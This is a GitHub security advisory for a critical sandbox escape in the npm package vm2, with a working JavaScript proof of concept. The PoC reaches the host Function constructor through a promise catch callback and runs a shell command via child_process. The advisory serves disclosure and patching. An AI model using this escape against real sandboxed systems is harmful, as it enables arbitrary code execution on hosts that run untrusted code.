# [C] vm2 has a Sandbox Escape

## Summary
Severity: Critical
Advisory: GHSA-99p7-6v5w-7xg8
CVE: CVE-2026-22709
CWE: CWE-693, CWE-913, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-26
Source: https://github.com/advisories/GHSA-99p7-6v5w-7xg8
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.10.2

## Details
In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.

```js
const { VM } = require("vm2");

const code = `
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
const promise = f();
promise.catch(e => {
    const Error = e.constructor;
    const Function = Error.constructor;
    const f = new Function(
        "process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })"
    );
    f();
});
`;

new VM().run(code);
```

In lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is sanitized, but `globalPromise.prototype.then` is not sanitized. The return value of async functions is `globalPromise` object.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-99p7-6v5w-7xg8
- https://nvd.nist.gov/vuln/detail/CVE-2026-22709
- https://github.com/patriksimek/vm2/commit/4b009c2d4b1131c01810c1205e641d614c322a29
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.10.2
